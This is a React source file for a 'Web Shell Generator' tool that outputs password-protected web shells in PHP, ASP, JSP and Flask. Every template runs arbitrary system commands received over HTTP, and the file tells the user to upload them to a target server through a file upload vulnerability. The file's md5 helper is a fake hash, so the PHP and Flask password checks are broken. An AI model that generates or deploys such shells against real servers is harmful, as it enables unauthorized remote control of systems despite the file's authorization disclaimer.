import { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './Tool.module.css';

type ShellType = 'php-simple' | 'php-mini' | 'asp-classic' | 'jsp-basic' | 'python-flask';

export default function WebShellGenerator() {
  const { setActiveGalaxyTool } = useStore();
  const [shellType, setShellType] = useState<ShellType>('php-simple');
  const [password, setPassword] = useState('');
  const [shellCode, setShellCode] = useState('');

  const templates: Record<ShellType, (pwd: string) => string> = {
    'php-simple': (pwd) => `<?php
// Simple PHP Web Shell
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (md5($_POST['pwd']) === '${md5(pwd)}') {
        echo "<pre>";
        echo shell_exec($cmd);
        echo "</pre>";
    } else {
        die("Access denied");
    }
}
?>
<form method="POST">
    <input type="password" name="pwd" placeholder="Password">
    <input type="text" name="cmd" placeholder="Command">
    <input type="submit" value="Execute">
</form>`,

    'php-mini': (pwd) => `<?php
@eval(isset($_POST['${pwd}']) ? $_POST['${pwd}'] : die());
?>`,

    'asp-classic': (pwd) => `<%
Dim cmd, pwd
pwd = Request.Form("pwd")
cmd = Request.Form("cmd")

If pwd = "${pwd}" Then
    Set WshShell = Server.CreateObject("WScript.Shell")
    Set WshExec = WshShell.Exec("cmd /c " & cmd)
    Response.Write("<pre>")
    Response.Write(WshExec.StdOut.ReadAll())
    Response.Write("</pre>")
Else
    Response.Write("Access denied")
End If
%>
<form method="POST">
    <input type="password" name="pwd">
    <input type="text" name="cmd">
    <input type="submit" value="Execute">
</form>`,

    'jsp-basic': (pwd) => `<%@ page import="java.io.*" %>
<%
String pwd = "${pwd}";
String userPwd = request.getParameter("pwd");
String cmd = request.getParameter("cmd");

if (pwd.equals(userPwd)) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println("<pre>");
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
    out.println("</pre>");
} else {
    out.println("Access denied");
}
%>
<form method="GET">
    <input type="password" name="pwd">
    <input type="text" name="cmd">
    <input type="submit" value="Execute">
</form>`,

    'python-flask': (pwd) => `from flask import Flask, request, render_template_string
import subprocess
import hashlib

app = Flask(__name__)
PASSWORD_HASH = '${md5(pwd)}'

TEMPLATE = '''
<form method="POST">
    <input type="password" name="pwd" placeholder="Password">
    <input type="text" name="cmd" placeholder="Command">
    <input type="submit" value="Execute">
</form>
{% if output %}
<pre>{{ output }}</pre>
{% endif %}
'''

@app.route('/', methods=['GET', 'POST'])
def shell():
    output = None
    if request.method == 'POST':
        pwd_hash = hashlib.md5(request.form['pwd'].encode()).hexdigest()
        if pwd_hash == PASSWORD_HASH:
            cmd = request.form['cmd']
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                output = output.decode('utf-8', errors='ignore')
            except subprocess.CalledProcessError as e:
                output = e.output.decode('utf-8', errors='ignore')
        else:
            output = "Access denied"
    return render_template_string(TEMPLATE, output=output)

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
`
  };

  const generateShell = () => {
    if (!password.trim()) {
      alert('Please enter a password');
      return;
    }
    const template = templates[shellType];
    setShellCode(template(password));
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(shellCode);
  };

  function md5(str: string): string {
    // Simple MD5 simulation for demo (use crypto in production)
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = ((hash << 5) - hash) + str.charCodeAt(i);
      hash = hash & hash;
    }
    return Math.abs(hash).toString(16).padStart(32, '0');
  }

  return (
    <div className={styles.tool}>
      <div className={styles.toolHeader}>
        <button className={styles.backButton} onClick={() => setActiveGalaxyTool(null)}>
          ← Back
        </button>
        <div className={styles.toolTitle}>
          <span className={styles.toolIcon}>🕸️</span>
          Web Shell Generator
        </div>
        <div className={styles.toolSubtitle}>
          Generate password-protected web shells for post-exploitation
        </div>
      </div>

      <div className={styles.toolContent}>
        <div className={styles.inputGroup}>
          <label>Shell Type</label>
          <select
            value={shellType}
            onChange={(e) => setShellType(e.target.value as ShellType)}
          >
            <option value="php-simple">PHP - Simple (Form-based)</option>
            <option value="php-mini">PHP - Mini (One-liner)</option>
            <option value="asp-classic">ASP Classic</option>
            <option value="jsp-basic">JSP Basic</option>
            <option value="python-flask">Python Flask</option>
          </select>
        </div>

        <div className={styles.inputGroup}>
          <label>Password</label>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Enter shell password"
          />
        </div>

        <button className={styles.primaryBtn} onClick={generateShell}>
          Generate Shell
        </button>

        {shellCode && (
          <div className={styles.outputSection}>
            <div className={styles.outputHeader}>
              <label>Generated Shell Code</label>
              <button className={styles.copyBtn} onClick={copyToClipboard}>
                Copy
              </button>
            </div>
            <div className={styles.output}>{shellCode}</div>
          </div>
        )}

        <div className={styles.infoBox}>
          <h3>Deployment Instructions</h3>
          <ol>
            <li>Save the generated code to a file with the appropriate extension (.php, .asp, .jsp, .py)</li>
            <li>Upload to the target web server using file upload vulnerability or other method</li>
            <li>Navigate to the shell URL in your browser</li>
            <li>Enter your password and execute system commands</li>
          </ol>
          <p className={styles.warning}>
            ⚠️ CRITICAL: Only deploy on systems you own or have explicit authorization to test. Unauthorized access is illegal.
          </p>
        </div>
      </div>
    </div>
  );
}
